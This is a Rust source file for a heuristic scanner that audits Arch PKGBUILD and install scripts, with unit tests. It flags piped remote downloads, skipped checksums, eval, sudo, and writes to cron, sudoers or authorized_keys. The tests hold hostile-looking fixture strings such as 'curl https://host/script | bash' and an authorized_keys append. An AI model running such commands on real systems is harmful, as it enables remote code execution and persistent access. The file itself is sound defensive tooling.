use crate::domain::Finding;
use std::collections::BTreeSet;

/// First explicitly identified ruleset; earlier captures were unversioned.
/// Increment when rule behavior changes so unchanged files require findings review.
pub const RULESET_VERSION: u32 = 1;

#[derive(Default)]
struct LiteralChecksums {
    array: bool,
    quote: Option<u8>,
    escaped: bool,
    word: Vec<u8>,
    word_line: usize,
    started: bool,
    dynamic: bool,
}
impl LiteralChecksums {
    fn finish(&mut self, skipped: &mut BTreeSet<usize>) {
        if !self.dynamic && self.word == b"SKIP" {
            skipped.insert(self.word_line);
        }
        self.word.clear();
        self.started = false;
        self.dynamic = false;
    }
    // A literal-word recognizer, not a Bash parser. Nested expressions are left uninterpreted.
    fn read(&mut self, raw: &str, line: usize, skipped: &mut BTreeSet<usize>) -> bool {
        for (offset, byte) in raw.bytes().enumerate() {
            if self.escaped {
                self.escaped = false;
                continue;
            }
            if self.quote != Some(b'\'') && byte == b'\\' {
                if offset + 1 == raw.len() && self.quote.is_none() && !self.started {
                    return true; // A standalone line continuation introduces no word.
                }
                self.dynamic = true;
                self.escaped = true;
                self.started = true;
                continue;
            }
            if self.quote == Some(byte) {
                self.quote = None;
                continue;
            }
            if self.quote.is_none() {
                match byte {
                    b'#' if !self.started => break,
                    b'(' => return false,
                    b')' | b';' | b'|' | b'&' => {
                        self.finish(skipped);
                        return false;
                    }
                    b'\'' | b'"' => {
                        if !self.started {
                            self.word_line = line;
                        }
                        self.started = true;
                        self.quote = Some(byte);
                        continue;
                    }
                    byte if byte.is_ascii_whitespace() => {
                        if self.started {
                            self.finish(skipped);
                            if !self.array {
                                return false;
                            }
                        }
                        continue;
                    }
                    _ => {}
                }
            }
            if !self.started {
                self.word_line = line;
            }
            self.started = true;
            if self.quote != Some(b'\'') && b"$`".contains(&byte) {
                self.dynamic = true;
            }
            // Only a four-byte literal can match; keep a bounded mismatch sentinel.
            if self.word.len() < 5 {
                self.word.push(byte);
            }
        }
        if self.escaped {
            self.escaped = false;
        } else if self.quote.is_some() {
            self.dynamic = true; // A literal newline cannot be part of the value SKIP.
        } else {
            self.finish(skipped);
            if !self.array {
                return false;
            }
        }
        true
    }
}

fn checksum_entries(content: &str) -> BTreeSet<usize> {
    let mut skipped = BTreeSet::new();
    let mut context: Option<LiteralChecksums> = None;
    for (index, raw) in content.lines().enumerate() {
        if skipped.len() > 2000 {
            break;
        }
        let value = if context.is_some() {
            raw
        } else {
            let Some((key, value)) = raw.trim_start().split_once('=') else {
                continue;
            };
            let key = key.strip_suffix('+').unwrap_or(key);
            if ![
                "cksums",
                "md5sums",
                "sha1sums",
                "sha224sums",
                "sha256sums",
                "sha384sums",
                "sha512sums",
                "b2sums",
            ]
            .iter()
            .any(|name| {
                key == *name
                    || key
                        .strip_prefix(name)
                        .and_then(|suffix| suffix.strip_prefix('_'))
                        .is_some_and(|arch| {
                            !arch.is_empty()
                                && arch
                                    .bytes()
                                    .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
                        })
            }) {
                continue;
            }
            let value = value.trim_start();
            let array = value.starts_with('(');
            context = Some(LiteralChecksums {
                array,
                ..Default::default()
            });
            if array { &value[1..] } else { value }
        };
        if !context
            .as_mut()
            .unwrap()
            .read(value, index + 1, &mut skipped)
        {
            context = None;
        }
    }
    skipped
}

fn shell_consumer(part: &str) -> bool {
    let command = part
        .trim_start()
        .split(|c: char| c.is_ascii_whitespace() || ";&()".contains(c))
        .next()
        .unwrap_or("");
    matches!(
        command.rsplit('/').next().unwrap_or(""),
        "sh" | "bash" | "zsh"
    )
}

pub fn scan(base: &str, content: &str) -> Vec<Finding> {
    scan_file(base, "PKGBUILD", content)
}

pub fn scan_file(base: &str, file: &str, content: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let skipped = if file == "PKGBUILD" {
        checksum_entries(content)
    } else {
        BTreeSet::new()
    };
    for (index, raw) in content.lines().enumerate() {
        if findings.len() > 2000 {
            break;
        }
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let lower = line.to_lowercase();
        let mut flag = |id: &str, severity: &str, title: &str, description: &str| {
            findings.push(Finding {
                id: format!("{file}:{id}-{}", index + 1),
                package: base.to_owned(),
                severity: severity.to_owned(),
                title: title.to_owned(),
                description: description.to_owned(),
                installed_version: None,
                fixed_version: None,
                cves: vec![],
                url: None,
                confidence: "heuristic".to_owned(),
                line: Some(index + 1),
                file: Some(file.into()),
            });
        };
        if (lower.contains("curl ") || lower.contains("wget "))
            && lower.contains('|')
            && lower.split('|').skip(1).any(shell_consumer)
        {
            flag(
                "remote-shell",
                "high",
                "Remote content piped to a shell",
                "Downloaded code can execute without an opportunity to inspect or verify it.",
            );
        }
        if skipped.contains(&(index + 1)) {
            flag(
                "checksum",
                "medium",
                "Checksum verification may be skipped",
                "Review each SKIP entry and verify whether a signature or pinned VCS commit provides integrity instead.",
            );
        }
        if lower.starts_with("eval ") || lower.contains(" eval ") {
            flag(
                "eval",
                "high",
                "Dynamic shell evaluation",
                "Inspect the evaluated value. Generated shell code can conceal additional actions.",
            );
        }
        if lower.contains("sudo ") || lower.contains("pkexec ") {
            flag(
                "privilege",
                "high",
                "Explicit privilege escalation",
                "Inspect the privileged command and its targets. Build code should run unprivileged; package install scripts already run with system privileges.",
            );
        }
        if lower.contains("http://") {
            flag(
                "http",
                "medium",
                "Unencrypted URL",
                "Check whether this is a source download. Prefer authenticated HTTPS and verify source signatures or checksums.",
            );
        }
        if lower.contains("git+") && !lower.contains("#commit=") && !lower.contains("#tag=") {
            flag(
                "vcs",
                "medium",
                "Unpinned version-control source",
                "The downloaded source may change independently of the package version. Review the exact commit before building.",
            );
        }
        if lower.starts_with("install=") || lower.starts_with("install =") {
            flag(
                "install-script",
                "medium",
                "Separate installation script",
                "Install scripts can run with system privileges. Inspect the referenced file and the scan coverage before installation.",
            );
        }
        if lower.contains("base64") && (lower.contains("-d") || lower.contains("--decode")) {
            flag(
                "encoded",
                "medium",
                "Encoded content is decoded",
                "Inspect the decoded content and where it is used. Encoding can hide executable payloads.",
            );
        }
        if [
            "/etc/cron",
            "/var/spool/cron",
            "authorized_keys",
            "/etc/sudoers",
        ]
        .iter()
        .any(|target| lower.contains(target))
        {
            flag(
                "sensitive-target",
                "high",
                "Sensitive persistence or access-control path",
                "Review whether this command reads or changes credentials, scheduled jobs, or privilege policy. A textual reference alone does not prove a malicious write.",
            );
        }
        if lower.contains("systemctl ")
            && [" enable", " start", " restart"]
                .iter()
                .any(|action| lower.contains(action))
        {
            flag(
                "service-action",
                "medium",
                "Service activation or restart",
                "Inspect which unit is affected and whether activating it is expected during package installation.",
            );
        }
    }
    findings.truncate(2001);
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn benign_skip_text_and_non_shell_consumers_are_not_execution_or_checksum_evidence() {
        let findings = scan(
            "fixture",
            "pkgdesc='A tool that skips duplicate files'\nsource=('https://example.test/skip.tar.gz')\necho SKIP\nsha256sums=('abc') # SKIP is not a checksum entry here\ncurl https://example.test/archive | sha256sum\nwget -qO- https://example.test/data | shred\n",
        );
        assert!(findings.is_empty(), "{findings:?}");
    }
    #[test]
    fn literal_checksum_entries_keep_multiline_and_architecture_locations() {
        let findings = scan(
            "fixture",
            "sha256sums_x86_64=(\n 'SKIP' # entry\n 'not-SKIP'\n)\nb2sums+=(\n SKIP\n)\nsha512sums=('SKIP') # skipinteg is unrelated\n",
        );
        assert_eq!(
            findings
                .iter()
                .map(|finding| finding.line)
                .collect::<Vec<_>>(),
            vec![Some(2), Some(6), Some(8)]
        );
    }
    #[test]
    fn checksum_literals_are_bounded_and_do_not_interpret_dynamic_values() {
        for algorithm in [
            "cksums",
            "md5sums",
            "sha1sums",
            "sha224sums",
            "sha256sums",
            "sha384sums",
            "sha512sums",
            "b2sums",
        ] {
            assert_eq!(
                scan("fixture", &format!("{algorithm}_aarch64=('SKIP')")).len(),
                1
            );
        }
        let findings = scan(
            "fixture",
            "sha256sums=('SKIP-extra' \"$SKIP\" '${SKIP}' \"$(printf SKIP)\" '# SKIP')\nsource=('SKIP')\nsha256sums_extra_text='not-SKIP'\nsha256sums=('SKIP' 'SKIP')\nsha1sums='SKIP'\n",
        );
        assert_eq!(
            findings
                .iter()
                .map(|finding| finding.line)
                .collect::<Vec<_>>(),
            vec![Some(4), Some(5)]
        );
        assert!(scan_file("fixture", "fixture.install", "sha256sums=('SKIP')").is_empty());
        assert_eq!(
            scan("fixture", &"sha256sums=('SKIP')\n".repeat(3000)).len(),
            2001
        );
    }
    #[test]
    fn shell_consumers_allow_paths_and_statement_boundaries_without_prefix_matches() {
        let findings = scan(
            "fixture",
            "curl https://example.test/script | /bin/bash\ncurl https://example.test/script | sh; echo done\ncurl https://example.test/script | bashful\ncurl https://example.test/script | /bin/sha256sum\n",
        );
        assert_eq!(
            findings
                .iter()
                .map(|finding| finding.line)
                .collect::<Vec<_>>(),
            vec![Some(1), Some(2)]
        );
    }
    #[test]
    fn literal_checksum_comments_quote_boundaries_and_continuations_keep_exact_values() {
        let findings = scan(
            "fixture",
            "sha256sums=(\\\nSKIP\n 'SKIP'#suffix\n # 'SKIP' ) is a comment\n S'K'IP\n)\nsha1sums=\\\n'SKIP'\n",
        );
        assert_eq!(
            findings
                .iter()
                .map(|finding| finding.line)
                .collect::<Vec<_>>(),
            vec![Some(2), Some(5), Some(8)]
        );
    }
    #[test]
    fn identifies_remote_execution_with_line_evidence() {
        let findings = scan(
            "test",
            "# curl x | sh\npkgname=test\ncurl https://host/script | bash\nsha256sums=('SKIP')\n",
        );
        assert_eq!(findings.len(), 2);
        assert_eq!(findings[0].line, Some(3));
        assert_eq!(findings[0].severity, "high");
    }
    #[test]
    fn distinguishes_pinned_vcs() {
        assert!(scan("test", "source=('git+https://host/repo#commit=abc')").is_empty());
        assert_eq!(scan("test", "source=('git+https://host/repo')").len(), 1);
    }
    #[test]
    fn flags_install_script_and_does_not_execute_shell() {
        let findings = scan(
            "test",
            "install=$pkgname.install\neval $(echo something)\nsudo touch /root/test",
        );
        assert_eq!(findings.len(), 3);
    }
    #[test]
    fn install_script_findings_identify_file_and_privileged_side_effects() {
        let findings = scan_file(
            "fixture",
            "fixture.install",
            "# curl x | sh\npost_install() {\ncurl https://host/script | bash\nsystemctl enable example.service\necho key >> /root/.ssh/authorized_keys\n}",
        );
        assert_eq!(findings.len(), 3);
        assert_eq!(findings[0].line, Some(3));
        assert!(
            findings
                .iter()
                .all(|finding| finding.file.as_deref() == Some("fixture.install"))
        );
        assert!(findings[2].id.starts_with("fixture.install:"));
    }
    #[test]
    fn excessive_patterns_are_bounded_with_a_truncation_sentinel() {
        let findings = scan_file("fixture", "PKGBUILD", &"eval command\n".repeat(10_000));
        assert_eq!(findings.len(), 2001);
        assert_eq!(findings[2000].line, Some(2001));
    }
}
